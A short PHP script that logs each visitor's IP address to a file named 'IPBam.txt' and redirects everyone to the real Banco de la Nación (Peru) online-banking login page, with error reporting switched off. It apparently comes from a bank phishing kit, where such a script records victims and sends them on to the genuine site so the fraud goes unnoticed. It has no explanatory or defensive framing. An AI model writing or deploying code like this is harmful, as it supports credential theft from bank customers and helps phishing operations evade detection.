<?php
error_reporting(0);

$ipv = $_SERVER["REMOTE_ADDR"];

$file = fopen("IPBam.txt", "r");
while($linea = fgets($file)){
	if(trim($linea) == trim($ipv)){
		header("location: https://zonasegura1.bn.com.pe/BNWeb/login.do");
		exit;
	}
}
fclose($file);

	$file = fopen("IPBam.txt", "a");
	fwrite($file, trim($ipv).PHP_EOL);
	fclose($file);
	header("location: https://zonasegura1.bn.com.pe/BNWeb/login.do");
?>